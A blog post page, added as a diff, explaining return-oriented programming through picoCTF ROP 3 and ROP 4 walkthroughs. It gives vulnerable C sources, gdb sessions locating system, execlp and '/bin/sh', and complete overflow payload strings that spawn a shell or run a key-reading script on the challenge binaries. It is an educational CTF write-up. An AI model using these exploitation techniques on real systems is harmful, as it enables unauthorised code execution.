@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <title>Zolmeister</title>
+    <meta name="description" content="Zolmeister- Blog" />
+    <link href='http://zolmeister.com/favicon.ico' rel='icon' type='image/x-icon'/>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400" />
+    <!-- This is for syntax highlight -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/syntax.css">
+    <!-- Customisation  -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css" />
+
+    <!-- RSS -->
+    <link rel="alternate" type="application/atom+xml" title="Zolmeister - Atom" href="http://www.zolmeister.com/feeds/posts/default" />
+    <link rel="alternate" type="application/rss+xml" title="Zolmeister - RSS" href="http://www.zolmeister.com/feeds/posts/default?alt=rss" />
+
+</head>
+<body class="home-template">
+
+
+    <main class="content" role="main">
+
+    <article class="post">
+        <header class="post-header">
+            <a id="blog-logo" href="/">
+                
+                    <span class="blog-title">Zolmeister</span>
+                
+            </a>
+        </header>
+
+        <span class="post-meta">
+        	<time datetime="2013-05-06">06 May 2013</time>
+        	<!--
+        		on
+	        	
+	        -->
+       	</span>
+
+        <h1 class="post-title"><a href="">ROP (Return Oriented Programming) - The Basics</a></h1>
+
+        <section class="post-content">
+            <p>If you&nbsp;haven&#39;t&nbsp;read my blog post on <a href="http://www.zolmeister.com/2013/05/buffer-overflows-basics.html">buffer overflows</a>, I recommend you read it to better understand this post. This is based on the CTF competition <a href="https://picoctf.com/">picoCTF</a>, but should apply to most (basic) ROP problems.</p>
+
+<p>What return oriented programming is all about:
+ROP is related to buffer overflows, in that it requires a buffer to overflow. The difference is that ROP is used to bypass certain protection measures that prevent normal buffer overflows. It turns out that a lot of the time, memory in programs is marked as non-executable. This means that we can&#39;t just put shellcode on the stack and have it execute, this is where ROP comes in.
+Recall the stack:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">[ return address ] &lt;-- this is the address of the next function to call, we want to overwrite this
+[  eip (address) ] &lt;-- this takes up memory
+[ stack variable ] &lt;-- this also takes up memory
+[    buffer[15]  ] &lt;-- this is the 16th character of our input string
+[      ...       ]
+[    buffer[0]   ] &lt;-- our input starts here
+</code></pre></div>
+<p>Now, our goal (as in buffer overflows) is to take&nbsp;control&nbsp;of the stack. At this point, go watch this video:&nbsp;<a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a>. It will explain the concept behind how we will need to modify the stack in order to get what we want, and I will show you the code.</p>
+
+<p>Lets walk through ROP 3:</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#undef _FORTIFY_SOURCE</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+  <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">vulnerable_function</span><span class="p">();</span>
+  <span class="n">write</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="s">&quot;Hello, World</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Ok, so we have a 128 byte buffer. Remember that there is extra stuff above it in the stack, so we need to add some extra bytes to our overflow (12). Our exploit string looks like this:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat &lt;<span class="o">(</span>python -c <span class="s1">&#39;print &quot;A&quot;*140&#39;</span><span class="o">)</span> - <span class="p">|</span> ./rop3
+</code></pre></div>
+<p>Now lets add a return address. Specifically, lets add the address that points to the <system> call.</p>
+
+<p>This is what we need to accomplish in C which will give us a shell: <code>system(&quot;/bin/sh&quot;);</code></p>
+
+<p>So we open up the program in gdb, and print out the adresss of system:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">gdb rop3
+     (gdb) break main
+     (gdb) run
+     (gdb) print system
+     $1 = {&lt;text variable, no debug info&gt;} 0xf7e68250 &lt;system&gt;
+</code></pre></div>
+<p>Alright, system is at&nbsp;<code>0xf7e68250,</code> which in escaped <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> looks like: <code>\x50\x82\xe6\xf7</code>.</p>
+
+<p>Now our exploit string looks like this:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat &lt;<span class="o">(</span>python -c <span class="err">&#39;</span>print <span class="s2">&quot;\x00&quot;</span>*140+<span class="s2">&quot;\x50\x82\xe6\xf7&quot;</span><span class="o">)</span> - <span class="p">|</span> ./rop3
+</code></pre></div>
+<p>We need 2 more things, a fake return&nbsp;address&nbsp;and an&nbsp;argument&nbsp;to pass to <code>system (&quot;/bin/sh&quot;)</code>.</p>
+
+<p>The fake return address can be anything, so I chose <code>&quot;\x00&quot;*4</code> (remember an address is 4 bytes).</p>
+
+<p>To get the <code>&quot;/bin/sh&quot;</code> string to pass in, were going to have find it inside of libc (unlike ROP 2, where it was given to you). This is done using gdb find, like so:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     (gdb) break main
+     (gdb) run
+     (gdb) print &amp;system
+     $1 = (&lt;text variable, no debug info&gt; *) 0xf7e68250 &lt;system&gt;
+     (gdb) find &amp;system,+9999999,&quot;/bin/sh&quot;
+     0xf7f86c4c
+     warning: Unable to access target memory at 0xf7fd0fd4, halting search.
+     1 pattern found.
+</code></pre></div>
+<p>Now we have the string <code>&quot;/bin/sh&quot;</code> at&nbsp;<code>0xf7f86c4c</code>. Lets finish constructing our exploit string:<br>
+    <code>(overflow)</code>  <code>(&lt;system&gt;)</code>      <code>(fake return address)</code> <code>(&quot;/bin/sh&quot; from libc)</code></p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">cat &lt;(python -c &#39;print &quot;\x00&quot;*140+&quot;\x50\x82\xe6\xf7&quot;+    &quot;\x00&quot;*4        +&quot;\x4c\x6c\xf8\xf7&quot;&#39;) - | ./rop3
+</code></pre></div>
+<p>Done!</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">    id
+     uid=1796(user1792) gid=3009(rop3) groups=1797(user1792),1002(webshell)
+</code></pre></div>
+<p>Now for ROP 4 (by writing this, I was able to then go back and solve it).</p>
+
+<p>Here is my solution:<br>
+<code>(overflow)</code> <code>(&lt;execlp&gt;)</code>     <code>(fake return)</code> <code>(&quot;/bin/sh&quot;)(twice)</code> <code>($EXPLOIT env variable)</code>    <code>(null)</code>  </p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">cat &lt;(python -c &#39;print &quot;A&quot;*140+&quot;\xb0\x3a\x05\x08&quot;+   &quot;A&quot;*4  +&quot;\x4f\xbf\x0c\x08&quot;*2+&quot;\x50\xd8\xff\xff&quot;+&quot;\xa1\x97\x0c\x08&quot;&#39;) - | ./rop4
+</code></pre></div>
+<p>And the problem source:</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="kt">char</span> <span class="n">exec_string</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+<span class="kt">void</span> <span class="nf">exec_the_string</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">execlp</span><span class="p">(</span><span class="n">exec_string</span><span class="p">,</span> <span class="n">exec_string</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">call_me_with_cafebabe</span><span class="p">(</span><span class="kt">int</span> <span class="n">cafebabe</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cafebabe</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">exec_string</span><span class="p">,</span> <span class="s">&quot;/sh&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">call_me_with_two_args</span><span class="p">(</span><span class="kt">int</span> <span class="n">deadbeef</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cafebabe</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cafebabe</span> <span class="o">==</span> <span class="mh">0xcafebabe</span> <span class="o">&amp;&amp;</span> <span class="n">deadbeef</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">exec_string</span><span class="p">,</span> <span class="s">&quot;/bin&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">exec_string</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+
+    <span class="n">vulnerable_function</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>So, probably not how you were suppose to solve it (based on the source code), but it works. With ROP4, were not given <system>, but we are given <execlp>. execlp takes 3 parameters: <code>char *file, char *arg, NULL</code></p>
+
+<p>Our goal then is to run this (not really though, as you will learn later): <code>execlp(&quot;/bin/sh&quot;,&quot;/bin/sh&quot;,NULL);</code></p>
+
+<p>Lets get the addresses of <code>&lt;exclp&gt;</code>, <code>&quot;/bin/sh&quot;</code>, <code>&quot;sh&quot;</code>, and <code>NULL</code> using gdb:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     (gdb) break main
+     (gdb) run
+     (gdb) print execlp
+     $1 = {&lt;text variable, no debug info&gt;} 0x8053ab0 &lt;execlp&gt;
+     (gdb) find &amp;execlp,+999999999,&quot;/bin/sh&quot;
+     0x80cbf4f
+     (gdb) print &amp;null
+     $3 = (&lt;data variable, no debug info&gt; *) 0x80c97a1
+     (gdb) x/s 0x80c97a1
+     0x80c97a1 &lt;null&gt;:      &quot;(null)&quot;
+</code></pre></div>
+<p>Alright, lets try it:  </p>
+
+<p><code>(overflow)</code>    <code>(execlp)</code>     <code>(fake return)</code> <code>(&quot;/bin/sh&quot;)(three times)</code>    <code>(null)</code>  </p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">cat &lt;(python -c &#39;print &quot;A&quot;*140+&quot;\xb0\x3a\x05\x08&quot;+   &quot;A&quot;*4+   &quot;\x4f\xbf\x0c\x08&quot;*3+   &quot;\xa1\x97\x0c\x08&quot;&#39;) - | ./rop4
+</code></pre></div>
+<p>*note, I don&#39;t know why I needed /bin/sh 3 times, but it works so just roll with it.</p>
+
+<p>However, when we do that, we get: <code>/bin/sh: /bin/sh: cannot execute binary file</code></p>
+
+<p>Now, here is where I will admit that I don&#39;t actually know C (ie. how your suppose to call execlp). What I do know is that it&#39;s calling sh, with the parameter sh, which you can&#39;t do (sh sh: error). So instead of trying to fix that, I decided to change the argument passed to sh to be my own program (in my home directory). It looks like this:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text"># rop4s.sh
+cat /problems/ROP_4_887f7f28b1f64d7e/key
+</code></pre></div>
+<p>Now, we need to be able to pass in the location of that file (&quot;/home2/user1792/rop4s.sh&quot;) to our execlp function. Here is where we need to use an environment variable. Lets assign our string to EXPLOIT and then use our program from buffer overflows to find its address (compile with &#39;-m32&#39; to get a shoter memory address - gcc -m32 -o printer printer.c):</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">export </span><span class="nv">EXPLOIT</span><span class="o">=</span><span class="s2">&quot;/home2/user1792/rop4s.sh&quot;</span>
+</code></pre></div><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* printer.c */</span>
+     <span class="cp">#include &lt;stdio.h&gt;</span>
+     <span class="cp">#include &lt;stdlib.h&gt;</span>
+     <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">%p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EXPLOIT&quot;</span><span class="p">));</span>
+      <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+     <span class="p">}</span>
+</code></pre></div>
+<p>Running that we get:&nbsp;0xffffd830 as our address. Alright, lets use that instead of our 3rd &quot;/bin/sh&quot;:<br>
+<code>(overflow)</code>    <code>(execlp)</code>      <code>(fake return)</code> <code>(&quot;/bin/sh&quot;)(two times)</code> <code>(EXPLOIT address)</code>     <code>(null)</code></p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     cat &lt;(python -c &#39;print &quot;A&quot;*140+&quot;\xb0\x3a\x05\x08&quot;+    &quot;A&quot;*4+   &quot;\x4f\xbf\x0c\x08&quot;*2+  &quot;\x30\xd8\xff\xff&quot;+&quot;\xa1\x97\x0c\x08&quot;&#39;) - | ./rop4
+     /bin/sh: �z X�K ����i686: No such file or directory
+</code></pre></div>
+<p>Well that didn&#39;t work. Lets increase the address of our environment variable by an arbitrary 32 (0x20).<br>
+<code>(overflow)</code> <code>(&lt;execlp&gt;)</code>     <code>(fake return)</code> <code>(&quot;/bin/sh&quot;)(twice)</code> <code>($EXPLOIT env variable)</code>    <code>(null)</code></p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     cat &lt;(python -c &#39;print &quot;A&quot;*140+&quot;\xb0\x3a\x05\x08&quot;+   &quot;A&quot;*4  +&quot;\x4f\xbf\x0c\x08&quot;*2+&quot;\x50\xd8\xff\xff&quot;+&quot;\xa1\x97\x0c\x08&quot;&#39;) - | ./rop4
+</code></pre></div>
+<p>Success! Wait... what just happened. <del>Yeah, I have no idea. Good luck!</del>
+(I got the 0x20 increase by just increasing the value arbitrarily to something like 0x18, and found my environment variable stuck in there. Just increased the address until it cut off the &quot;EXPLOIT=&quot; bit before the path).</p>
+
+<p>Normally <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> is turned on, which randomizes addresses (like our environment variable) so that they&#39;re <del>impossible</del>&nbsp;hard to find. In this case ASLR was not turned on, but the stack got modified slightly anyways. Basically something caused the stack to change and move stuff around (ie. the real address to our environment variable), which we cannot always predict. That being said, we can still guess (as long as ASLR is off) and it turns out that we&nbsp;weren&#39;t&nbsp;that far off (0x20). Bypassing ASLR is outside the scope of this post (and my knowledge) but its nice to clear up that bit.</p>
+
+<h4>Update:</h4>
+
+<p>Finding the environment variable with a mangled stack can be tough, so I figured out a more robust solution. Instead of using an environment variable, lets just make a new command and use strings from libc to call it. This is what I mean:</p>
+
+<p>1. remember rop4s.sh?, make a copy of it and name it &quot;ch&quot;
+2. now edit your <a href="http://www.cyberciti.biz/faq/howto-print-path-variable/">PATH</a>&nbsp;and add the directory of your &quot;ch&quot; shell script file
+3. now you can call &quot;ch&quot; from the command line, and it should run your script</p>
+
+<p>Now lets see how the code looks:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     # first we need a string from libc that isn&#39;t already a command (I chose &quot;ch&quot;)
+     gdb rop4
+     (gdb) break main
+     (gdb) run
+     (gdb) print execlp
+     &gt;&gt; $1 = {&lt;text variable, no debug info&gt;} 0x8053ab0 &lt;execlp&gt;
+     (gdb) find &amp;execlp,+9999999,&quot;ch&quot;
+     &gt;&gt; 0x80ccf48 &lt;__PRETTY_FUNCTION__.8742+9&gt;
+     &gt;&gt; 0x80dafa1 #well, use this address
+     # now we isolate rop4s.sh and rename it to &quot;ch&quot;
+     mkdir cmd
+     cp rop4s.sh cmd/ch
+     # and then add it to our path
+     export PATH=/home2/user1792/cmd:$PATH
+     # and our new exploit becomes:
+</code></pre></div>
+<p><code>(fill)</code>  <code>(execlp)</code>          <code>(retn)</code> <code>(&quot;/bin/sh&quot;)(twice)</code>      <code>(&quot;ch&quot;)</code>              <code>(null)</code>  </p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">     cat &lt;(python -c &#39;print &quot;A&quot;*140+&quot;\xb0\x3a\x05\x08&quot;+&quot;A&quot;*4+&quot;\x4f\xbf\x0c\x08&quot;*2+ &quot;\xa1\xaf\x0d\x08&quot;+&quot;\xa1\x97\x0c\x08&quot;&#39;) - | ./rop4
+</code></pre></div>
+<p>For more info on ROP&#39;s (and bypassing ASLR) check out these sources:<br>
+<a href="https://isisblogs.poly.edu/2011/10/21/geras-insecure-programming-warming-up-stack-1-rop-nxaslr-bypass/">https://isisblogs.poly.edu/2011/10/21/geras-insecure-programming-warming-up-stack-1-rop-nxaslr-bypass/</a><br>
+<a href="http://blog.the-playground.dk/2012/08/lesson-learned-from-my-first-rop-exploit.html">http://blog.the-playground.dk/2012/08/lesson-learned-from-my-first-rop-exploit.html</a><br>
+<a href="http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx">http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx</a><br>
+<a href="http://security.dico.unimi.it/%7Egianz/pubs/acsac09.pdf">http://security.dico.unimi.it/~gianz/pubs/acsac09.pdf</a>  </p>
+
+        </section>
+
+        
+
+        <footer class="post-footer">
+        	<!-- If we want to display author's name and bio -->
+            
+                <section class="author">
+                	<header> <a href=""> <img class="profile" src="/assets/images/profile.png" alt="Zolmeister"></a></header>
+                	<article>
+                		<!-- Author Name -->
+                    	<h4> Zoli Kahan </h4>
+                    	<!-- Author Bio -->
+                    	<p>
+                    		<a target="_blank" href="http://insignia.zolmeister.com">Projects</a> |
+                        <a target="_blank" href="https://github.com/Zolmeister">GitHub</a> |
+                        <a target="_blank" href="https://clay.io">Clay.io</a>
+                    	</p>
+                    </article>
+                </section>
+            
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="http://twitter.com/share?text=ROP (Return Oriented Programming) - The Basics&amp;url=http://zolmeister.com/2013/05/rop-return-oriented-programming-basics.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://zolmeister.com/2013/05/rop-return-oriented-programming-basics.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://zolmeister.com/2013/05/rop-return-oriented-programming-basics.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+            
+            <section class="disqus">
+        	    <div id="disqus_thread"></div>
+              <script type="text/javascript">
+                  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                  var disqus_shortname = 'zolmeister'; // required: replace example with your forum shortname
+
+                  /* * * DON'T EDIT BELOW THIS LINE * * */
+                  (function() {
+                      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                  })();
+              </script>
+
+            </section>
+            
+
+        </footer>
+
+    </article>
+
+</main>
+
+
+    <footer class="site-footer">
+        <a class="subscribe icon-feed" href="feeds/posts/default"><span class="tooltip">Subscribe!</span></a>
+        <div class="inner">
+             <section class="copyright">All content copyright <a href="">Zolmeister</a> &copy;  &bull; All rights reserved.</section>
+        </div>
+    </footer>
+
+
+    <script type="text/javascript" src="/assets/js/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="/assets/js/index.js"></script>
+
+    <!-- Google Analytics Tracking code -->
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-30570115-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>
+</body>
+</html>
